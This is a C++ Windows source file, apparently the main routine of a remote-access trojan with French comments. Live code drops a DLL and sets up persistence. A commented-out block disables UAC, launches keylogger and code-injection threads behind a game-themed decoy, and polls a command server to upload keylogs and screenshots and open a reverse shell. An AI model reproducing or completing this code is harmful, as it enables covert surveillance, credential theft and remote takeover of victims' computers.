#include "pa5a.hpp"

EXTERN_C_START

/********************************************************************************************************************************/
INT WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ INT nCmdShow) 
{
    CreateDirectory(DATA_FOLDER_W, NULL);

    wprintf(L"command line : [%ls]\n", lpCmdLine);
    
    //Ajout de la persistance
    printf("%s\n", WritePa5aDll() ? "DLL -> OK" : "DLL -> ERROR");
    printf("%s\n", SetPersistence() ? "Persistence -> OK" : "Persistence -> ERROR");
    /*printf("%s\n", DisableUac() ? "UAC -> OK" : "UAC -> ERROR");

    HANDLE hThreadKeylogger = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadKeylogger, NULL, 0, NULL);
    
    if (!StrStrW(lpCmdLine, L"/silent"))
        HANDLE hThreadLeagueOfLegends = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadLeagueOfLegends, NULL, 0, NULL);
    else
        HANDLE hThreadInjector = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadInjector, NULL, 0, NULL);

    while (TRUE)
    {
        printf("Sending client informations\n");
        if (!SendClientInformations())
            continue;

        //Polling for new commands
        printf("Polling for new commands ...\n");
        Commands commands = GetCommands(SERVER_NAME_A, HTTPS_PORT);

        if (commands.keylogs)
        {
            printf("Sending keylogs ...\n");
            SendKeylogs();
        }
        if (commands.screenshot)
        {
            printf("Sending screenshot ...\n");
            CreateDirectoryW(DATA_FOLDER_W, NULL);
            SendScreenshot();
        }
        if (commands.reverseShell)
        {
            printf("Opening reverse shell ...\n");

            //Thread de Reverse Shell
            HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadReverseShell, NULL, 0, NULL);
        }

        Sleep(1000);
    }*/

    return 0;
}
/********************************************************************************************************************************/

EXTERN_C_END